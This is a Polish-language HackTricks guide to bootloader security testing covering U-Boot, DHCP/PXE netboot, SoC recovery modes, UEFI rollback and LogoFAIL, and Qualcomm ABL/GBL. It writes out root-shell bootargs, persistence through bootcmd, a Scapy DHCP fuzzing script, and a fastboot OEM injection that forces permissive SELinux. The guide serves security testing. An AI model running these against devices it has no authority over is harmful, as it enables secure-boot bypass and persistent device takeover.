# Testowanie bootloadera

{{#include ../../banners/hacktricks-training.md}}

Poniższe kroki są zalecane przy modyfikacji konfiguracji startowych urządzeń i testowaniu bootloaderów takich jak U-Boot i loaderów klasy UEFI. Skoncentruj się na uzyskaniu wczesnego wykonania kodu, ocenie zabezpieczeń podpisów/rollback oraz nadużywaniu ścieżek recovery lub network-boot.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot — szybkie triki i nadużywanie środowiska

1. Access the interpreter shell
- Podczas uruchamiania naciśnij znany klawisz przerwania (często dowolny klawisz, 0, spacja lub specyficzna dla płytki sekwencja "magic") przed wykonaniem `bootcmd`, aby przejść do prompta U-Boot.

2. Inspect boot state and variables
- Przydatne polecenia:
- `printenv` (zrzut environment)
- `bdinfo` (info o płytce, adresy pamięci)
- `help bootm; help booti; help bootz` (obsługiwane metody bootowania kernela)
- `help ext4load; help fatload; help tftpboot` (dostępne loadery)

3. Modify boot arguments to get a root shell
- Dodaj `init=/bin/sh`, aby kernel uruchamiał shell zamiast normalnego init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot from your TFTP server
- Skonfiguruj sieć i pobierz kernel/fit image z LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- Jeśli storage środowiska nie jest write-protected, możesz zachować kontrolę:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Sprawdź zmienne takie jak `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` które wpływają na ścieżki fallback. Nieprawidłowe wartości mogą umożliwić wielokrotne przerwania i wejście do shella.

6. Check debug/unsafe features
- Szukaj: `bootdelay` > 0, `autoboot` wyłączone, nieograniczone `usb start; fatload usb 0:1 ...`, możliwość `loady`/`loads` przez serial, `env import` z niezaufanych nośników oraz kerneli/ramdisków ładowanych bez sprawdzeń podpisów.

7. U-Boot image/verification testing
- Jeśli platforma deklaruje secure/verified boot z obrazami FIT, wypróbuj obrazy unsigned i zmodyfikowane:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Brak `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` lub stary tryb `verify=n` często pozwala na bootowanie dowolnych payloadów.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- Legacy BOOTP/DHCP w U-Boot miał luki bezpieczeństwa związane z bezpieczeństwem pamięci. Na przykład CVE‑2024‑42040 opisuje ujawnienie pamięci przez spreparowane odpowiedzi DHCP, które mogą leakować bajty z pamięci U-Boot z powrotem na sieć. Testuj ścieżki DHCP/PXE z nadmiernie długimi/granicznymi wartościami (option 67 bootfile-name, vendor options, file/servername fields) i obserwuj zawieszenia/leaki.
- Minimalny snippet Scapy do stresowania parametrów boot podczas netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Sprawdź też, czy pola nazwy PXE są przekazywane do logiki shella/loadera bez sanitizacji, gdy są łączone z OS-side provisioning scripts.

9. Rogue DHCP server command injection testing
- Uruchom złośliwy serwer DHCP/PXE i spróbuj wstrzyknąć znaki do pól filename lub options, aby dotrzeć do interpreterów poleceń w późniejszych etapach łańcucha boot. Metasploit’s DHCP auxiliary, `dnsmasq`, lub niestandardowe skrypty Scapy sprawdzą się dobrze. Najpierw izoluj sieć laboratoryjną.

## Tryby recovery SoC, które nadpisują normalny boot

Wiele SoC udostępnia BootROM "loader" mode, który przyjmie kod przez USB/UART nawet gdy obrazy w flashu są nieprawidłowe. Jeśli secure-boot fuses nie są przepalone, może to zapewnić arbitralne wykonanie kodu bardzo wcześnie w łańcuchu.

- NXP i.MX (Serial Download Mode)
- Narzędzia: `uuu` (mfgtools3) lub `imx-usb-loader`.
- Przykład: `imx-usb-loader u-boot.imx` aby wgrać i uruchomić niestandardowy U-Boot z RAM.
- Allwinner (FEL)
- Narzędzie: `sunxi-fel`.
- Przykład: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` lub `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Narzędzie: `rkdeveloptool`.
- Przykład: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` do stage'owania loadera i uploadu niestandardowego U-Boot.

Oceń, czy urządzenie ma przepalone eFuses/OTP dla secure-boot. Jeśli nie, tryby BootROM download często omijają wyższe poziomy weryfikacji (U-Boot, kernel, rootfs) poprzez wykonanie twojego pierwszego stage payloadu bezpośrednio z SRAM/DRAM.

## UEFI/PC-class bootloaders: szybkie kontrole

10. ESP tampering and rollback testing
- Zamontuj EFI System Partition (ESP) i sprawdź komponenty loadera: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, ścieżki z logo vendorów.
- Spróbuj uruchomić ze zdegradowanymi lub znanymi podatnymi podpisanymi komponentami boot, jeśli Secure Boot revocations (dbx) nie są aktualne. Jeśli platforma nadal ufa starym shimom/bootmanagerom, często można załadować własny kernel lub `grub.cfg` z ESP, by uzyskać persistencję.

11. Boot logo parsing bugs (LogoFAIL class)
- Kilku OEM/IBV firmware miało podatności w parsowaniu obrazów w DXE, które przetwarzają boot logo. Jeśli atakujący może umieścić spreparowany obraz na ESP w ścieżce specyficznej dla vendor (np. `\EFI\<vendor>\logo\*.bmp`) i zrestartować, wykonanie kodu we wczesnym etapie boot może być możliwe nawet przy włączonym Secure Boot. Przetestuj, czy platforma akceptuje loga dostarczane przez użytkownika i czy te ścieżki są zapisywalne z poziomu OS.

## Android/Qualcomm ABL + GBL (Android 16) luki zaufania

Na urządzeniach Android 16, które używają Qualcomm ABL do ładowania Generic Bootloader Library (GBL), sprawdź, czy ABL uwierzytelnia aplikację UEFI, którą ładuje z partycji `efisp`. Jeśli ABL jedynie sprawdza obecność UEFI app i nie weryfikuje podpisów, primitive zapisu do `efisp` staje się pre-OS unsigned code execution podczas boot.

Praktyczne kontrole i ścieżki nadużyć:

- efisp write primitive: Potrzebujesz sposobu na zapis własnej aplikacji UEFI do `efisp` (root/privileged service, błąd aplikacji OEM, ścieżka recovery/fastboot). Bez tego luka w GBL nie jest bezpośrednio osiągalna.
- fastboot OEM argument injection (ABL bug): Niektóre buildy akceptują dodatkowe tokeny w `fastboot oem set-gpu-preemption` i dopisują je do kernel cmdline. To może wymusić permissive SELinux, umożliwiając zapisy chronionych partycji:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Jeśli urządzenie jest załatane, polecenie powinno odrzucić dodatkowe argumenty.
- Bootloader unlock via persistent flags: Payload na etapie boot może ustawić trwałe flagi unlock (np. `is_unlocked=1`, `is_unlocked_critical=1`) aby zasymulować `fastboot oem unlock` bez serwera OEM/pozwolenia. To trwała zmiana po ponownym uruchomieniu.

Uwaga/triage:

- Potwierdź, czy ABL wykonuje weryfikację podpisów GBL/UEFI payload z `efisp`. Jeśli nie, traktuj `efisp` jako powierzchnię wysokiego ryzyka dla persistencji.
- Śledź, czy fastboot OEM handlers w ABL są poprawione, aby walidować liczbę argumentów i odrzucać dodatkowe tokeny.

## Ostrzeżenia sprzętowe

Bądź ostrożny przy interakcji z SPI/NAND flash w czasie wczesnego boot (np. uziemianie pinów aby obejść odczyty) i zawsze konsultuj datasheet flasha. Błędnie zsynchronizowane zwarcia mogą uszkodzić urządzenie lub programator.

## Notatki i dodatkowe wskazówki

- Wypróbuj `env export -t ${loadaddr}` i `env import -t ${loadaddr}` aby przenosić bloby environment między RAM a storage; niektóre platformy pozwalają na import env z nośników wymiennych bez uwierzytelnienia.
- Dla persistencji na systemach Linux bootujących przez `extlinux.conf`, modyfikacja linii `APPEND` (np. wstrzyknięcie `init=/bin/sh` lub `rd.break`) na partycji boot często wystarcza, gdy nie stosuje się sprawdzeń podpisów.
- Jeśli userland udostępnia `fw_printenv/fw_setenv`, sprawdź czy `/etc/fw_env.config` odpowiada rzeczywistemu storage env. Błędnie skonfigurowane offsety pozwalają czytać/pisać niewłaściwy region MTD.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
{{#include ../../banners/hacktricks-training.md}}
